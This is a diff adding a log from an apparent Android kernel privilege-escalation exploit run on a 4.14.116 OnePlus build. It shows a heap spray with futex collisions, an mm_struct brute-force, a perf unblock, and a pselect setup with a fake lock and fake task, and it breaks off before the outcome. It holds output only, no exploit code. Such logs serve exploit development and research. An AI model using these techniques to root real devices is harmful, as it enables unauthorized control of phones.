@@ -1,0 +1,39 @@
+[*] kernel: 4.14.116
+[+] offsets matched: 4.14.116
+[*] init_cred image=ffffff800af640b0 alias=ffffff8002f640b0
+[+] startup context pid=7331 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=7331 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[+] build config pid=7331 label=ghostlock_oneplus slide=pselect main=pselect
+[+] p0 profile pid=7331 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffff802a4021a0 bootid_data=ffffff802a6aa868 init_task=ffffff802a40cf00 root_tg=ffffff802a63d580 sysctl_bootid=ffffff802a6aa868
+[*] p0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[*] [T+0ms] exploit start
+[*] selinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[*] === W1c: perf unblock === target=0xffffff8002f421e8 mode=1
+[*] [T+3ms]   heap spray start
+[*] KernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[*] KernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[*] start finding collisisons
+[*] target    0000007052df10c8
+[*]   000000605246e258[*]   0000006052486318[*]   0000006052523800[*]   0000006052527820[*]   000000605253d8d0[*]   0000006052564a08[*]   00000060527c5d10[*]   000000605286c248[*]   0000006052875290[*]   00000060528772a0[*]   0000006052883300[*]   0000006052885310[*]   0000006052896398[*]   00000060528a3400[*]   00000060528a9430[*] found 15 collisisons
+[*] [p1] spray: pre/post mms killed, waiting leak child[*] KernelSnitch collisions: found
+[*] [p2] collisions ok, launching bruteforce[*] start bruteforcing
+[*] [  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[*] [  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[*] [  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[*] [  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[*] [  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[*] [  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[*] [  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[*] [  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[*] [p3] bruteforce returned cnt=1 best=1[*] KernelSnitch bruteforce: state=4 found=1 mm_struct=0xffffff8100005a00
+[*] [probe] base=ffffff8100000000 payload_mode=0 entering skb payload[*] [p5] prepare_skb_payload returned ok[*] [p4] skb payload built, reclaim setup[*] done
+[*] prepare_kernel_page ok attempt=1
+[*] [T+2173ms]   heap spray done
+[-] pselect cannot place tree_left waiter_word=2 global_word=-5 words_per_set=5 nfds=320
+[-] pselect cannot place pi_parent waiter_word=3 global_word=-4 words_per_set=5 nfds=320
+[-] pselect cannot place pi_right waiter_word=4 global_word=-3 words_per_set=5 nfds=320
+[-] pselect cannot place pi_left waiter_word=5 global_word=-2 words_per_set=5 nfds=320
+[-] pselect cannot place task waiter_word=6 global_word=-1 words_per_set=5 nfds=320
+[*] pselect route setup attempt=1 simple=0 shift=-7 page=ffffff8100000000 fake_lock=ffffff8100000000 fake_w0=ffffff8100000300 fake_task=ffffff8100000400 in0=ffffff8100000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
+[*] pselect pre-select +0ms
